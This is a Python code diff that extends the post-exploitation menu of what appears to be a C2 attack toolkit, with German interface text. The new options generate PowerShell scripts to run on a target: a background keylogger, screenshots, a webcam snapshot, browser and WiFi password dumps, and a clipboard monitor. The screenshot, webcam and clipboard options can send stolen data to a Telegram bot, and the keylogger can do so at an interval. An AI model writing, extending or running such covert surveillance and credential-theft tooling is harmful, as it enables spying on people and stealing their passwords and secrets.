@@ -3071,6 +3071,13 @@ async def menu_postexploit():
         menu_item(" 5", "📁  File Exfiltration",          "🔴", "Juicy Files finden + exfiltrieren")
         menu_item(" 6", "🪟  LOLBAS Cheatsheet",          "🟡", "Windows-Bordmittel: certutil, mshta, wmic...")
         menu_item(" 7", "📡  pypykatz (Dump analysieren)","🔴", "LSASS.dmp auf Kali analysieren")
+        print()
+        menu_item(" 8", "⌨️   Keylogger",                 "⛔", "Alle Tasten aufzeichnen (PS1, kein Upload)")
+        menu_item(" 9", "📸  Screenshot",                 "🔴", "Vollbild-Screenshot → Datei oder Telegram")
+        menu_item(" W", "📷  Webcam Snapshot",            "🔴", "Kamera-Foto via WIA COM (kein Tool-Upload)")
+        menu_item(" B", "🌐  Browser Passwörter",         "⛔", "Chrome/Edge/Firefox Login-Daten via DPAPI")
+        menu_item(" I", "📶  WiFi Passwörter",            "🔴", "Alle gespeicherten WLAN-Keys via netsh")
+        menu_item(" C", "📋  Clipboard Monitor",          "🔴", "Zwischenablage überwachen — Tokens/Passwörter")
         menu_item(" 0", "← Zurück", "")
 
         choice = prompt("postexploit")
@@ -3195,6 +3202,158 @@ async def menu_postexploit():
             print()
             from tools.c2.post_exploit import analyze_lsass_dump
             await run_tool_live(analyze_lsass_dump(dump_path))
+
+        elif choice == "8":
+            banner(); section("⌨️  KEYLOGGER", "Alle Tasten aufzeichnen — kein Tool-Upload nötig")
+            info_box([
+                "Standalone PowerShell Keylogger via SetWindowsHookEx (C# Add-Type).",
+                "",
+                "  → Läuft im Hintergrund als Job — kein sichtbares Fenster",
+                "  → Braucht KEINEN Admin — läuft im normalen User-Kontext",
+                "  → Speichert alle Tasten in eine Datei",
+                "  → Optional: alle N Sekunden automatisch via Telegram senden",
+                "",
+                "Stoppen: Stop-Job / Remove-Job oder Datei manuell lesen",
+                "Auf Kali exfiltrieren: Option 5 → File Exfiltration",
+            ])
+            print()
+            log_path = ask("Log-Datei auf Ziel", "C:\\Windows\\Temp\\kl.txt")
+            use_tg = ask("Telegram-Versand? [j/n]", "n")
+            tg_token, tg_chat, send_interval = "", "", 300
+            if use_tg.lower() == "j":
+                tg_token = ask("Bot-Token")
+                tg_chat  = ask("Chat-ID")
+                try:
+                    send_interval = int(ask("Sende-Intervall in Sekunden", "300"))
+                except ValueError:
+                    send_interval = 300
+            print()
+            from tools.c2.post_exploit import keylogger_ps1, keylogger_stop_ps1
+            ps1 = keylogger_ps1(log_path, tg_token, tg_chat, send_interval)
+            print(f"  {G}[+] Keylogger PS1 — auf Ziel ausführen:{R}\n")
+            print(f"  {C}{ps1}{R}")
+            print(f"\n  {Y}[→] Log lesen/löschen:{R}")
+            print(f"  {C}{keylogger_stop_ps1(log_path)}{R}")
+
+        elif choice == "9":
+            banner(); section("📸  SCREENSHOT", "Vollbild-Screenshot — kein Tool-Upload")
+            info_box([
+                "Screenshot via System.Windows.Forms.Screen (Windows built-in).",
+                "",
+                "  → Kein Tool-Upload, kein Admin nötig",
+                "  → Speichert als PNG in angegebenen Pfad",
+                "  → Optional: Bild direkt als Telegram-Foto senden",
+                "",
+                "Auf Kali holen: Option 5 → File Exfiltration",
+            ])
+            print()
+            save_path = ask("Speicherpfad auf Ziel", "C:\\Windows\\Temp\\sc.png")
+            use_tg = ask("Direkt via Telegram senden? [j/n]", "n")
+            tg_token, tg_chat = "", ""
+            if use_tg.lower() == "j":
+                tg_token = ask("Bot-Token")
+                tg_chat  = ask("Chat-ID")
+            print()
+            from tools.c2.post_exploit import screenshot_ps1
+            ps1 = screenshot_ps1(save_path, tg_token, tg_chat)
+            print(f"  {G}[+] Screenshot PS1 — auf Ziel ausführen:{R}\n")
+            print(f"  {C}{ps1}{R}")
+
+        elif choice == "w":
+            banner(); section("📷  WEBCAM SNAPSHOT", "Kamera-Foto via WIA COM — kein Tool-Upload")
+            info_box([
+                "Webcam-Foto via Windows Image Acquisition (WIA) COM-Objekt.",
+                "",
+                "  → Kein Tool-Upload, keine extra Software",
+                "  → Fallback: ffmpeg (wenn installiert) oder DirectShow",
+                "  → Kamera-LED leuchtet kurz auf (WIA-Limitation)",
+                "  → Optional: Foto direkt an Telegram senden",
+                "",
+                "Tipp: Vorher mit Screenshot testen ob jemand am PC ist.",
+            ])
+            print()
+            save_path = ask("Speicherpfad auf Ziel", "C:\\Windows\\Temp\\cam.jpg")
+            use_tg = ask("Direkt via Telegram senden? [j/n]", "n")
+            tg_token, tg_chat = "", ""
+            if use_tg.lower() == "j":
+                tg_token = ask("Bot-Token")
+                tg_chat  = ask("Chat-ID")
+            print()
+            from tools.c2.post_exploit import webcam_ps1
+            ps1 = webcam_ps1(save_path, tg_token, tg_chat)
+            print(f"  {G}[+] Webcam PS1 — auf Ziel ausführen:{R}\n")
+            print(f"  {C}{ps1}{R}")
+
+        elif choice == "b":
+            banner(); section("🌐  BROWSER PASSWÖRTER", "Chrome · Edge · Firefox via DPAPI")
+            info_box([
+                "Dumpt gespeicherte Passwörter aus allen gängigen Browsern.",
+                "",
+                "  Chrome / Edge / Brave → DPAPI (user-spezifisch, kein Admin)",
+                "  Firefox → logins.json (base64, key4.db für Klartext)",
+                "  Windows Credential Manager → cmdkey /list",
+                "",
+                "Hinweis: Chrome v80+ nutzt AES-GCM mit Master Key.",
+                "  Für Klartext-Extraktion: Telegram-Agent !browsers nutzen",
+                "  (Agent hat direkten Zugriff auf DPAPI + AES-Key im laufenden Chrome)",
+            ])
+            print()
+            save_path = ask("Ausgabe-Datei auf Ziel", "C:\\Windows\\Temp\\bpw.txt")
+            print()
+            from tools.c2.post_exploit import browser_passwords_ps1
+            ps1 = browser_passwords_ps1(save_path)
+            print(f"  {G}[+] Browser-Password PS1 — auf Ziel ausführen:{R}\n")
+            print(f"  {C}{ps1[:600]}...{R}")
+            print(f"\n  {DIM}[vollständiges Script — zum Kopieren: Scroll Up]{R}")
+            print(f"\n  {Y}Tipp für Chrome AES-GCM: Telegram-Agent C2 → !browsers{R}")
+
+        elif choice == "i":
+            banner(); section("📶  WIFI PASSWÖRTER", "Alle gespeicherten WLAN-Keys")
+            info_box([
+                "Dumpt alle gespeicherten WLAN-Passwörter via netsh wlan.",
+                "",
+                "  → Kein Admin nötig für eigene Profile",
+                "  → Als Admin: ALLE Benutzer-Profile sichtbar",
+                "  → Zeigt: SSID, Auth-Methode, Klartext-Passwort",
+                "",
+                "Nützlich für: laterale Bewegung ins gleiche WLAN,",
+                "  oder als gefundene Credentials im Bericht.",
+            ])
+            print()
+            save_path = ask("Ausgabe-Datei auf Ziel", "C:\\Windows\\Temp\\wifi.txt")
+            print()
+            from tools.c2.post_exploit import wifi_passwords_ps1
+            ps1 = wifi_passwords_ps1(save_path)
+            print(f"  {G}[+] WiFi Password PS1 — auf Ziel ausführen:{R}\n")
+            print(f"  {C}{ps1}{R}")
+
+        elif choice == "c":
+            banner(); section("📋  CLIPBOARD MONITOR", "Zwischenablage überwachen")
+            info_box([
+                "Überwacht die Windows-Zwischenablage in Echtzeit.",
+                "",
+                "  → Fängt: Passwörter, API-Keys, Tokens, Krypto-Wallets,",
+                "           Kreditkartennummern, URLs, SSH-Keys",
+                "  → Markiert automatisch 'interessante' Inhalte in Rot",
+                "  → Optional: interessante Inhalte sofort an Telegram senden",
+                "  → Läuft für N Sekunden, dann automatisch Stop + Speichern",
+            ])
+            print()
+            try:
+                duration = int(ask("Dauer in Sekunden", "600"))
+            except ValueError:
+                duration = 600
+            save_path = ask("Log-Datei auf Ziel", "C:\\Windows\\Temp\\clip.txt")
+            use_tg = ask("Interessante Inhalte via Telegram? [j/n]", "n")
+            tg_token, tg_chat = "", ""
+            if use_tg.lower() == "j":
+                tg_token = ask("Bot-Token")
+                tg_chat  = ask("Chat-ID")
+            print()
+            from tools.c2.post_exploit import clipboard_monitor_ps1
+            ps1 = clipboard_monitor_ps1(save_path, duration, tg_token, tg_chat)
+            print(f"  {G}[+] Clipboard-Monitor PS1 — auf Ziel ausführen:{R}\n")
+            print(f"  {C}{ps1}{R}")
 
         wait_key()
 
